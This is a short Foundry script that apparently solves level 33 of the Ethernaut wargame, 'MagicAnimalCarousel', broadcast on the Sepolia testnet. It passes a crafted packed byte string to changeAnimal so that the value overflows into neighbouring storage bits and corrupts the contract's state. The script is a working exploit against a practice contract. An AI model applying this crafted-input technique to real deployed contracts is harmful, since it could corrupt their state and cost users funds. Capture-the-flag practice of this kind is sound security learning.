// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/level33.sol";

contract Level33Script is Script {
    function run(address instanceAddress, address sender) external {
        MagicAnimalCarousel target = MagicAnimalCarousel(instanceAddress);

        vm.startBroadcast(sender);
        target.setAnimalAndSpin("cutecat");
        string memory animal = string(
            abi.encodePacked(hex"10000000000000000000ffff")
        );
        target.changeAnimal(animal, 1);
        target.setAnimalAndSpin("cat");
        vm.stopBroadcast();
    }
}
//forge script script/level33.s.sol:Level33Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey --sig "run(address,address)" 0x6061f166A8443dd051b68577193FfA0406e8d2fe 0x0ADf707838CDc0aBd5Cc361A9C680CEe4487F148
